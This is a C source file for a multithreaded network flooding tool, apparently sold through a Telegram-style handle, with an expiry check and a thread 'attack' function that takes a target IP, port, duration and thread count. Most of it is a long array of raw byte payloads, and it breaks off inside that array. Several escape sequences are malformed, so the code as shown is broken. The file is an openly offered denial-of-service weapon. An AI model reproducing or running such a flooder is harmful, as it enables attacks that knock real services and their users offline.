#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRATION_YEAR 2026
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 1

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);   
    if (difftime(now, mktime(&expiration_date)) > 0) {
        printf("This file is closed by @MEXDEVELOPER ...\nDM TO PAID  FILE. @MEXDEVELOPER\n");
        exit(EXIT_FAILURE);
    }
}

void usage() {
    printf("Usage: ./rohit ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\x6B\x8C",
        "\x23\xF7",
        "\x4E\xA5",
        "\x91\xD2",
        "\x7F\xB9",
        "\xC8\x3A",
        "\x5D\xE6",
        "\xAF\x7C",
        "\xE1\x50",
        "\x3B\x4A",
        "\xfe\x00\x00",
        "\x88\x00\x00",
        "\xab\x00\x00",
        "\x3c\x00\x00",
        "\x57\x00\x00",
        "\x46\x00\x00",
        "\xe0\x00\x00",
        "\x72\x00\x00",
        "\x91\x00\x00",
        "\x55\x8a\x3b\xe7\x48\xf0",
        "\xd5\x4c\xeb\x9a\xc8\xd1",
        "\x61\xfa\x2d\x8b\xf2\x27",
        "\x89\x17\x30\x63\xa4\x52",
        "\x73\xed\x15\x7f\x96\x04",
        "\xbc\x38\x7a\x59\xec\xab",
        "\x01\xa2\x4d\xb6\xca\x3f",
        "\x40\x6e\x19\x75\x82\xfd",
        "\x57\x31\xc8\xae\x4b\x10",
        "\xf6\xd2\x9e\x1a\x6c\x07",
        "\x4e\xe8\x59\x31\x00\x56\x5c\x48\x77\x43\xf7\x32\x77\x48\x48\x50\x2f\xed\xed\x0d\x0a\x4a\x48\x56\x3a\x20\x27\x57\x57\x55\x27\x7a\x27\x68\x27\x27\x27\x27\x33\x3a\x10\x20\x30\x30\x0d\x0a\x41\x53\x57\x3a\x20\x70\x6d\x6d\x3a\xb4\x6d\x77\x6f\x27\x48\x57\x0d\x0a\x41\x54\x3a\x20\x77\xdd\x6e\x6e\x27\x72\x69\x6e\x74\x69\x66\x6c\x6f\x72\x65\x27\x63\x54\x27\x6f\x67\x3a\x63\xf1\x6d\x6e\x62\x72\x42\x3a\x08\x0d\x0a\x46\x57\x5a\x2d\x4f\x3c\x40\x4f\x20\x6a\x4f\x4f\x27\x4c\x63\x6e\x3a\x20\x3c\x77\x27\x6d\x6d\x68\x65\x2f\xd8\x36\x75\x63\x27\x62\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\xe7\x59\xed\x50\x56\x5c\x48\x77\xba\x7f\x72\x77\x48\x48\x50\x2f\x88\xfd\x0d\x0a\x5a\x41\x56\x3a\x20\xc7\x68\x74\x47\x77\x6e\xa7\x66\x7a\x77\x69\x71\x30\x30\x0d\x0a\x55\x5a\x4d\x3a\x20\x70\x64\x64\x3a\xb7\x4f\x57\x42\x27\x66\x0d\x0a\x48\x57\x3a\x20\x68\xdd\xe7\x6f\x77\xa5\x69\x6e\x74\xed\x6c\x6f\x6b\x65\x67\x72\xee\x54\xee\x6f\x67\x7a\xcd\x6d\xfe\x62\xfe\x72\xee\xb9\x0d\x0a\x41\x4e\x41\x2d\x4f\xfd\x40\x4f\x20\x79\x4f\xee\x77\x4c\x62\xeb\x3a\x20\x73\x77\x72\x76\x68\xe1\x36\x75\xee\x77\x72\x4c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4e\x18\x59\x31\x99\x56\x5c\x48\x77\x43\x6f\x72\x77\x48\x48\x50\x2f\xd9\xbe\x0d\x0a\x59\x46\x56\x3a\x20\xe8\x77\x54\x43\x77\x5e\x27\x67\x66\x77\x28\x39\x30\x30\x0d\x0a\x4d\x41\x4d\x3a\x20\x70\x6a\x6a\x3a\x57\x7f\x77\x27\x47\x79\x0d\x0a\x48\x54\x3a\x20\x7d\x33\x66\x55\x77\x72\x29\x6e\x74\xcb\x6c\x6f\x8d\x65\x6b\x72\xf8\x66\x73\x4f\x67\xbc\x74\xed\x6e\xb2\x72\xbe\x0d\x0a\x41\x45\x4a\x2d\x4f\xa7\x40\x4f\x20\x6a\x4f\x7e\x77\x7c\x6b\x9c\x3a\x20\x28\x77\x27\x46\x68\x4f\x32\x75\xdb\x77\x67\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4d\xe2\x53\xef\x41\x56\x5c\x48\x77\x4a\xa7\x72\x77\x48\x48\x50\x2f\x19\x0e\x0d\x0a\x4b\x4e\x56\x3a\x20\x7f\x7a\x7f\x43\x77\x44\xee\x64\x66\x77\x4f\x31\x30\x30\x0d\x0a\x4c\x41\x4d\x3a\x20\x70\x44\x44\x3a\x43\x56\x28\x67\x27\x4a\x0d\x0a\x48\x53\x3a\x20\x33\x11\x66\x66\x77\x2d\x6e\x74\xb6\x6c\x6f\x6b\x65\x67\x72\x06\x54\x06\x6f\x67\x96\x43\x6d\x7e\x62\xde\x72\xb6\x0d\x0a\x4e\x4a\x41\x2d\x4f\x7a\x40\x4f\x20\xa8\x4f\x26\x77\x1c\xec\xcb\x3a\x27\x77\x27\x6e\x68\xfa\x36\x75\xdb\x77\xcb\x6c\x0d\x0a\x0d\x0a\x00\x00",
    "\x62\xf9\xdf\x3a\x34\x99\x5c\x48\xa8\x24\x47\xc7",
    "\x62\xf9\xdf\x3a\x20\x99\xe8\x62\xf9\xdf\x3a\x24\x99\x44\x48\x75",
        "\x4d\x2d\xfd\xe7\x4a\x56\x5c\x48\x77\xab\x7f\x72\x77\x48\x48\x50\x2f\xaf\x0d\x0a\x4f\x4e\x56\x3a\x20\xfa\x68\x7f\x47\x77\x6f\x27\x7a\x66\x7f\x69\x70\x30\x30\x0d\x0a\x4f\x45\x4d\x3a\x20\x70\x44\x66\x3a\xef\x59\x77\x77\x6e\x74\x0d\x0a\x49\x47\x3a\x20\x72\xdd\xab\x6f\x77\xbe\x69\x6e\x74\xcb\x6c\x6f\x6b\x65\x67\x72\x0f\x54\x0f\x6f\x67\xb2\x33\x6d\x73\x62\xb7\x72\xeb\x0d\x0a\x45\x42\x41\x2d\x4f\xb7\x40\x4f\x20\xe8\x4f\x4f\x77\x4c\xec\x1b\x3a\x20\x27\x77\x27\x72\x68\xe7\x36\x75\xcb\x77\x68\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xc7\x6e\x53\x31\x48\x56\x5c\x48\x77\xc3\x7f\x72\x77\x48\x48\x50\x2f\x1d\xed\x0d\x0a\x4a\x56\x56\x3a\x20\xb7\x78\x68\x47\x77\x64\x27\x9a\x66\x77\x6e\x78\x30\x30\x0d\x0a\x55\x4f\x4d\x3a\x20\x70\x86\x64\x3a\xc7\x64\x77\x43\x27\x68\x0d\x0a\x50\x54\x3a\x20\x9d\x33\x66\x66\x77\x2f\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x67\x54\x67\x6f\x67\xdc\x68\x6d\x58\x62\xf9\x72\xe6\x0d\x0a\x42\x4e\x41\x2d\x4f\x77\x40\x4f\x20\xf2\x4f\x7b\x77\x1c\x0a\x1d\x3a\x20\x64\x77\x77\x56\x68\x64\x36\x75\x3a\x77\x84\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4d\xdf\x53\xe1\x41\x56\x5c\x48\x77\xeb\xb8\x72\x77\x48\x48\x50\x2f\xfd\x7e\x0d\x0a\x4a\x4a\x56\x3a\x20\x7d\x77\x5f\x47\x77\x7e\xf1\x66\x66\x77\xcf\x30\x30\x30\x0d\x0a\x52\x4d\x4d\x3a\x20\x70\xdf\x77\x3a\x67\x64\x72\x27\x27\x4a\x0d\x0a\x4a\x55\x3a\x20\x3e\x33\x6e\x66\x77\x7f\x9e\x74\x6e\x6c\x6f\x6b\x65\x67\x72\xd4\x54\xd4\x6f\x67\xd0\x3b\x6d\x40\x62\xd6\x72\xe1\x0d\x0a\x45\x55\x41\x2d\x4f\xb9\x40\x4f\x20\x8c\x4f\x4a\x77\x4b\xef\xe3\x3a\x20\x77\x55\x27\xbf\x68\xf4\x36\x75\x8e\x77\x91\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4d\x2d\xa4\x91\x27\x56\x5c\x48\x77\x61\x4c\x72\x77\x48\x48\x50\x2f\x1f\x78\x0d\x0a\x46\x4f\x56\x3a\x20\x67\x7e\x75\x47\x77\x4d\xd1\x3b\x66\x77\x72\xd7\x30\x30\x0d\x0a\x4f\x4d\x4d\x3a\x20\x70\x77\x3d\x3a\xd7\x64\x77\x43\x27\x65\x0d\x0a\x41\x54\x3a\x20\x75\x33\x66\x66\x77\xae\x6e\x74\x2e\x6c\x6f\x6b\x65\x67\x72\x1c\x54\x1c\x6f\x67\x3f\x74\x6d\x63\x62\xdd\x72\xe2\x0d\x0a\x52\x58\x41\x2d\x4f\xf7\x40\x4f\x20\x6c\x4f\x4e\x77\x44\x0d\x0d\x3a\x20\x43\x77\x77\x45\x68\xdd\x36\x75\x6e\x77\x6c\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\xa6\x39\x13\x05\x56\x5c\x48\x77\x4f\xc7\x72\x77\x48\x48\x50\x2f\xa1\x3e\x0d\x0a\x47\x46\x56\x3a\x20\x3e\x77\x6d\x47\x77\x1e\xf7\x66\x66\x77\x72\x2e\x30\x30\x0d\x0a\x48\x4d\x4d\x3a\x20\x70\xc4\x77\x3a\x67\x64\x77\x27\x27\x57\x0d\x0a\x41\x52\x3a\x20\x4d\x33\x66\x66\x77\x8e\x6e\x74\x5b\x6c\x6f\x6b\x65\x67\x72\x54\x54\x67\x6f\x67\x67\xc3\x6d\x82\x62\x67\x72\x96\x0d\x0a\x4e\x54\x41\x2d\x4f\x27\x40\x4f\x20\x82\x4f\x4e\x77\x08\x7f\x11\x3a\x20\x77\x77\x4d\x4e\x68\xfb\x36\x75\x2f\x77\x8c\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\x3d\x93\x75\x05\x56\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x56\x19\x4e\x85\x06\x06\x26\x88\x77\x4f\xa0\x47\x77\x49\x69\x50\x2b\x19\x4e\x0d\x0a\x4d\x75\x56\x3a\x20\xa7\x76\x64\x47\x77\x3f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x6d\x4c\x3a\x20\x70\x44\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x26\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x61\x2d\x4f\x67\x40\x4f\x20\xc2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x36\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x75\x3d\xae\x75\x05\x56\x5c\x08\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x62\xf9\xdf\x3a\x00\x98\xcb\x81\x94\xca\x41\x80\x74\xd1\x60\x88\x67\x44\xd6\x29\x4c\xb9\xcd\xb9\xf7",
        "\x62\xf9\xdf\x3a\xb4\x9a\xc3\x81\xd4\x9b\x2d\xb6\x97\x6b\x1e\x67\x8e\x92\xa6\x28\x06\xb8\x6f\x8a\xc3\x5e\x53\x8a\xba\x1d\x0c\x17\x2d\x63\xd2\x67",
        "\x78\xf6\xe5\x8a\xb2\x9c\xf3\x81\x8c\x48\x1e\xbd\x9d\xcdxc8\x71\xa7\x76\x8f\x47\xe2\x95\x42\xff\x5c\x81\x00\xff\x0c\x7a\x45\xa1\x16\x1a\x7d\xde\x98\x5e\xc5\x94\xb8\xa2\x4b\x3e\x84\xc8",
        "\xe8\xf1\x3d\x8a\xde\x5c\x44\x81\x78\xc0\xa1\x71\x84\x0e\xd0\xf1\x6d\xb5\x82\x16\x62\x85\x85\x2c\x30\xa5\xd2\x05\xc7\x0b\xd6\x73\xf6\x6e\x5d\xc6\xa8\x5e\x46\xfa\x4b\xed\xc6\xf3\xb4\x24\xe8\xb4\xe1",
        "\x54\xf1\xe6\x08\xc0\xb9\xe5\xa0\x94.fc\x3b\xcb\x87\x7a\x68\x52\xbe\x66\x92\x29\xaf\x83\xfd\x36\x4c\xa9\xaa\xc8\x35\xdf\x78\x29\xdb\xaa\x37\x64\x82\x78\x4f\xf4\x5e\x8a\x03\xdc\x98\x04\x35",
        "\x34\xf0\x16\x08\xa0\x87\x15\x92\xb4\x40\xe5\xd1\x1d\x66\xaa\x0a\x38\xf8\x01\xbb\x55\x19\x5b\x43\x08\x85\xdf\xc7\x64\x79\x6f\xcb\x81\xd5\x8a\x61\x8a",
        "\x38\xf6\x0b\x8a\xc7\x9c\xe1\x81\x84\xa6\x44\xb0\xa0\x06\x11\xfe\xe9\xf6\x92\x18\x8a\x92\x4f\x5c\x10\xbc\x7f\x45\x18\xdd\x5c\xca\x9d\xda\x18\x66\x89\x82\x30\x3e\x0e\x8d\x4b\x54\xb5\x08\x33\xac\xe3\xad\x57\xba\x81\x94\xed\xd3\x23\x25\xd7\x13\x28\x63\x62\x37\x7f\x19\x7a\x9f\x01\x19\x40\x15\xcd\xf7\x17\xe1\x22\x45\xb8\x32\xd4\x3f\x0e\xf6\xd4\x10\x28\xe7\x0f\xce\xf1\xe0\x7f\x94\x7e\x0c\xde\x33\x44\x1d\x61\x26\x5a\x02\x59\x28\x41\x2d\xa2",
        "\x98\xf6\x20\x09\x50\xcc\xa5\x88\xb3\xc0\x29\xb5\x05\x5f\xaa\xce\xfb\x3c\x66\x2a\xe6\xb2\xc7\x16\xfe\xcb\xd7\xa7\xd4\xb1\x76\xa7\x13\x74\xb4\x0b\x61\x2f\x43\xfa\xc3\x20\x87\x49\xba\x08\xc6\x8d\xa8\x87\x01\x4c\xa1\xc0\x2b\x13\x21\xa5\xc6\xe3\xca\x3f\x66\x38\x73\x89\xaf\x10\x4d\x76\x48\x9b\x1e\x39\x3a\x90\xe1\xb6\x94\xc2\x3b\xd6\xfb\xc8\x96\xf7\xe1\x6a\x32\xee\xa0\xdc\x70\x50\x5b\x23\x6c\xfd\x6e\xe1\xe0\x68\xce\x5e\x75\xcc\x53\xe0\x0c\x96\x29\x0a\xc0\x73\x24\xab\xb5\xce\xd4\x93\x14\x8b\x16\x6d\x97\x0f\x4e\x58\x46\x0e\xcb\x98\xe4\xe4\x53\xa6\xc2\x04\x75\x1e\xb8\x2b\x1d\x93\xf7\xad\xbf\x57\xc9\x9f\x37\x24\xd2\xc7\x5a\x22\xa4\xf4\x35\xf2\x22\xfa\xdc\x75\x74\xea\x2d\xfb\x04\x1d\xab\xde\xab\x62\x48\xb2\x1a\xd7\xf6\x11\x3f\xc5\x4e\xda\x12\xb3\x15\x50\x88\x99\xa2\x24\x02\x3a\xf3\x1f\xc1\x2b\x1e\xaa\xf2\xbd\x3d\xd8\x89\xdb\xc7\x5f\x82\xaf\xd4\x67\x4b\x02\x6c\xaa\xf7\xfb\xbe\x6d\x26\xa2\xf2\xfe\xd6\x14\x02\xaf\x79\xdf\xa6\x17\xfa\x34",
        "\x37\x3d\x93\x75\x05\x56\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x85\x3c\x93\x85\x05\x56\x5c\x68\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd2\x3d\x93\x75\x05\x56\x5c\x08\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\x3d\x93\x75\x05\x56\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xc7\x3d\x93\x75\x05\x56\x5c\x98\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x07\x3d\x23\x75\x05\x56\x5c\x28\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x07\x3d\x93\x75\x05\x06\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x7b\x03\x4d\x00\x4f\x18\x10\x00\x12\x06\x10\x00\x7f\x00\x00\x01\x00\x00\x0f\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x02\x50\x18\x40\x00\x40\x06\x20\x00\x7f\x00\x30\x01\x7f\x00\x00\x01\x00\xf2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x65\x03\x01\x00\x50\x18\x40\x00\x26\x06\x20\x00\x7f\x5a\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x3f\x00\x50\x18\x40\x00\x40\x06\x93\x00\x7f\x00\x00\x01\x57\x00\x00\x01\xa0\xcd\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x03\x00\x50\x18\x40\x00\x94\x06\x20\x00\x7f\x00\x00\x01\x23\x00\xf3\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x00\x50\x5a\x40\x00\x40\x21\x20\x00\x7f\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x07\x03\x01\x00\x50\x18\x40\x10\x40\x5c\x20\x00\x7f\x00\x01\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x37\x00\x00\x00\x00\x00\x00\x00",
        "\xb9\x03\x01\x00\x50\x18\x40\x05\x40\x06\x20\x00\x07\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00",
        "\x16\xaf\x01\x00\x50\x18\x40\x00\x40\x06\x20\x00\x7f\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x78\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x00\x50\x18\x40\x00\x40\x06\xe9\x00\x7f\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x00\x17\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x00\x50\x18\x40\x00\x40\x06\x20\x00\x7f\x00\x00\x01\xee\x00\x00\x01\xa4\x02\x00\x00\x00\x00\x00",
        "\xb9\x13\x6c\x1b\x69\xf4\x22\xcd\x8f\x67\x48\xf5\xff\x64\x5b\x91\x84\x29\xc0\x30\x51\xd6\x86\xf8\xc8\xe1\x11\x32\xe6\x7e\x01\x6b\x37\x4a\xf5\x27\xcb\xf3\x44\x0d\xe6\x11\xe1\xfd\xe5\x4d\x48\xbb\xfa\x34\x05\x36\x05\x5a\xe4\xfa\x56\xa9\x02\xe6\x68\xe6\xb0\x85\x3a\x1e\x77\xfd\x4b\xb0\x1e\x2d\xc0\x35\x27\x45\x34\x04\xd8\xf2\xae\xc5\x87\x10\xf6\xd4\x6b\x57\xba\x9e\x9c\x49\x48\x1b\xe4\x11\xca\x35\x31\x63\xe2\x06\x87\xf8\xf3\xa7\x23\x73\xda\xb5\x7f\x1f\xf2\x4f\x8f\x79\x5a\xb7\xbc\x34\xe2\xe6\x06\x1c\xcc\xec\x1c\x27\x4a\x57\fa\x11",
        "\x9a\x0e\x48\x0b\x7a\x59\x75\x1e\x5c\x0b\xed\x33\x8b\x8d\xf2\x0e\x86\x1d\x14\x8a\x52\xea\xf8\x67\x69\xae\xd9\x02\x16\xf1\xf8\x08\x15\x2d\x61\x24\xa6\xc5\x61\xa5\x0e\xf0\x04\x89\xce\xfd\x8a\x5c\x77\xf0\x27\x42\x64\xe7\x02\x97\xf8\x0b\xd1\x42\x29\x0a\x8e\xd1\xe0\x69\x79\x2b\x5d\xab\xb3\xf1\xff\xd3\x09\x5c\x38\x09\x52\x7e\xa8\x86\xd3\x74\xb9\x34\x47\x3e\x3f\xd7\x32\xc4\x0e\x2b\x45\x9b\x2b\x7b\x19\xc4\x16\xc3\x76\x1f\xf2\x37\x32\x62\xbe\x5a\xc7\x71\x91\x08\xb0\xda\xa1\xfe\x42\x75\x86\xab\x64\x3a\x60\x23\xe9\x1e\xe7\xee\xb8",
        "\xa4\x8a\x5b\x1e\x20\x71\x26\x1b\xc6\x2b\xcd\xba\x6d\xe9\xb0\xe6\x54\x25\x87\xf3\x6e\xde\xe9\xa4\x3b\xf6\x0f\x05\x2e\x69\xb2\x6c\x3d\xb9\xb9\x50\x1b\x16\x4b\x6c\x9b\xa4\x2f\x94\x77\x61\x68\xff\xb5\xe3\xea\xa0\x82\x97\x3d\xb4\x6e\x8b\x95\xed\xaf\x50\xdd\xb0\x3e\x48\x31\x2a\x40\xbe\x03\xda\xdc\x71\x61\x22\x80\x48\xdc\x0b\x64\x71\xc8\xd3\x42\x44\x69\x37\x91\x6c\x08\x92\x9e\x52\x4c\xef\x8a\x32\xf0\xe2\x4d\x14\x3e\xf1\xcf\xd2\x19\xe0\xfb\xf0\x86\x1d\x42\x05\xab\x2d\x44\x5c\xe8\x0a\x96\x4a\x1e\xd3\x3b\x5d\xf5\x99\x99\xe9\x9c\x90",
        "\xe6\x62\x7d\x86\x94\x47\x6f\x0c\xc4\xcc\x15\x62\x52\x8a\x42\xe0\x70\x6d\xe0\xd7\x1a\x64\x7a\x21\xf0\x6f\x4a\xda\x0d\xa5\x7e\x07\x63\x85\x07\x6d\x4f\x42\x52\x6c\x7b\x69\x05\x76\x22\x84\x1b\xec\x1d\x9e\x40\x23\xe0\x06\x2d\x1e\xe3\x4a\x33\x86\x2e\xa8\x5d\x2e\xc5\x7b\x3c\x5d\x70\x8b\x2b\x9c\x64\x09\x81\x42\x9c\x2b\x4c\x1b\x2d\x3c\xe2\xa1\xf3\x50\xee\x0f\xe7\x54\x69\x33\x77\x66\x33\x49\x07\x1b\x1d\xe6\x43\xda\xc7\x13\xc1\xca\x93\xca\xec\x41\xbd\x97\x3a\xb3\x7d\x18\xe8\x36\x06\x78\x51\x5a\x7e\x14\x9e\x4c\x44\xbe\x48\x5d\xb1\x50",
